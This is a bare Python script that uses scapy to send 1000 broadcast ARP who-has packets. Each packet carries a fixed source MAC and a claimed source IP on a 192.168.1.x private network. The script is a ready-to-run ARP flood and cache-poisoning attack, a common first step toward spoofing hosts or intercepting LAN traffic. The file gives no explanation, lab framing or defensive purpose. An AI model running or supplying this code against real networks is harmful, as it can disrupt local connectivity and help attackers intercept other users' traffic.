from scapy.all import *
COUNT = 1000

pkt = Ether(src="52:8d:ff:7e:e7:f6", dst="ff:ff:ff:ff:ff:ff")/ARP(op=ARP.who_has, hwdst="ff:ff:ff:ff:ff:ff", pdst="192.168.1.82", hwsrc="52:8d:ff:7e:e7:f6", psrc="192.168.1.96" )

for _ in range(COUNT):
    sendp(pkt)
